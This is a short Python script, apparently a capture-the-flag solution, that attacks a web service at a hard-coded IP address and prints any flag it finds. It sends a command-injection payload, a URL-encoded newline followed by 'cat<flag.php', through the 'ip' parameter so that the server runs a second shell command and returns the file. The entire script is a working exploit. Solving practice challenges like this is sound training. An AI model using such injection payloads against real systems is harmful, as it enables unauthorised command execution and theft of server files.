from requests import *
from termcolor import colored

url = 'http://140.115.59.13:8765/?ip='
payload = '%0acat<flag.php'

res = get( url + payload )
print res.content

if res.content.find('AD{') > -1:
    print colored( 'Find the flag !' , 'yellow' ) , colored( res.content[ res.content.find('AD{') : res.content.find('}' , res.content.find('AD{')) + 1 ] , 'green' )
